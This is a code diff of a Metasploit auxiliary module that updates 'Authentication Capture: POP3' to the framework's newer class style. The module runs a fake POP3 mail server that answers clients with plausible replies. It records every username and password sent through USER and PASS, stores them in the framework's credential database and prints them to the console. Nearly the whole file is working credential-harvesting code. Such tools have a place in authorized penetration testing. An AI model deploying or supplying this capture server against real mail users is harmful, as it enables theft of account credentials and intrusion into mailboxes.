@@ -1,125 +1,140 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::TcpServer
+  include Msf::Auxiliary::Report
 
+  def initialize
+    super(
+      'Name' => 'Authentication Capture: POP3',
+      'Description' => %q{
+        This module provides a fake POP3 service that
+      is designed to capture authentication credentials.
+      },
+      'Author' => ['ddz', 'hdm'],
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        [ 'Capture', { 'Description' => 'Run POP3 capture server' } ]
+      ],
+      'PassiveActions' => [
+        'Capture'
+      ],
+      'DefaultAction' => 'Capture',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
+    )
 
-require 'msf/core'
+    register_options(
+      [
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 110 ])
+      ]
+    )
+  end
 
+  def setup
+    super
+    @state = {}
+  end
 
-class Metasploit3 < Msf::Auxiliary
+  def run
+    @myhost = datastore['SRVHOST']
+    @myport = datastore['SRVPORT']
+    exploit
+  end
 
-	include Msf::Exploit::Remote::TcpServer
-	include Msf::Auxiliary::Report
+  def on_client_connect(client)
+    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
+    client.put "+OK\r\n"
+  end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-	def initialize
-		super(
-			'Name'        => 'Authentication Capture: POP3',
-			'Version'     => '$Revision$',
-			'Description'    => %q{
-				This module provides a fake POP3 service that
-			is designed to capture authentication credentials.
-			},
-			'Author'      => ['ddz', 'hdm'],
-			'License'     => MSF_LICENSE,
-			'Actions'     =>
-				[
-					[ 'Capture' ]
-				],
-			'PassiveActions' =>
-				[
-					'Capture'
-				],
-			'DefaultAction'  => 'Capture'
-		)
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
 
-		register_options(
-			[
-				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 110 ])
-			], self.class)
-	end
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
 
-	def setup
-		super
-		@state = {}
-	end
+    create_credential_login(login_data)
+  end
 
-	def run
-		@myhost = datastore['SRVHOST']
-		@myport = datastore['SRVPORT']
-		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-		exploit()
-	end
+  def on_client_data(client)
+    data = client.get_once
+    return if !data
 
-	def on_client_connect(c)
-		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
-		c.put "+OK\r\n"
-	end
+    cmd, arg = data.strip.split(/\s+/, 2)
+    arg ||= ''
 
-	def on_client_data(c)
-		data = c.get_once
-		return if not data
-		cmd,arg = data.strip.split(/\s+/, 2)
-		arg ||= ""
+    if (cmd.upcase == 'USER')
+      @state[client][:user] = arg
+      client.put "+OK\r\n"
+      return
+    end
 
-		if(cmd.upcase == "USER")
-			@state[c][:user] = arg
-			c.put "+OK\r\n"
-			return
-		end
+    if (cmd.upcase == 'PASS')
+      @state[client][:pass] = arg
 
-		if(cmd.upcase == "PASS")
-			@state[c][:pass] = arg
+      report_cred(
+        ip: @state[client][:ip],
+        port: @myport,
+        service_name: 'pop3',
+        user: @state[client][:user],
+        password: @state[client][:pass],
+        proof: arg
+      )
+      print_good("POP3 LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
+      @state[client][:pass] = data.strip
+      client.put "+OK\r\n"
+      return
+    end
 
-			report_auth_info(
-				:host      => @state[c][:ip],
-				:port      => @myport,
-				:sname     => 'pop3',
-				:user      => @state[c][:user],
-				:pass      => @state[c][:pass],
-				:source_type => "captured",
-				:active    => true
-			)
-			print_status("POP3 LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
-			@state[c][:pass] = data.strip
-			c.put "+OK\r\n"
-			return
-		end
+    if (cmd.upcase == 'STAT')
+      client.put "+OK 0 0\r\n"
+      return
+    end
 
-		if(cmd.upcase == "STAT")
-			c.put "+OK 0 0\r\n"
-			return
-		end
+    if (cmd.upcase == 'CAPA')
+      client.put "-ERR No Extended Capabilities\r\n"
+      return
+    end
 
-		if(cmd.upcase == "CAPA")
-			c.put "-ERR No Extended Capabilities\r\n"
-			return
-		end
+    if (cmd.upcase == 'LIST')
+      client.put "+OK 0 Messages\r\n"
+      return
+    end
 
-		if(cmd.upcase == "LIST")
-			c.put "+OK 0 Messages\r\n"
-			return
-		end
+    if cmd.upcase == 'QUIT' || cmd.upcase == 'RSET' || cmd.upcase == 'DELE'
+      client.put "+OK\r\n"
+      return
+    end
 
-		if(cmd.upcase == "QUIT" || cmd.upcase == "RSET" || cmd.upcase == "DELE")
-			c.put "+OK\r\n"
-			return
-		end
+    print_status("POP3 UNKNOWN CMD #{@state[client][:name]} \"#{data.strip}\"")
+    client.put "+OK\r\n"
+  end
 
-		print_status("POP3 UNKNOWN CMD #{@state[c][:name]} \"#{data.strip}\"")
-		c.put "+OK\r\n"
-	end
-
-	def on_client_close(c)
-		@state.delete(c)
-	end
-
+  def on_client_close(client)
+    @state.delete(client)
+  end
 
 end
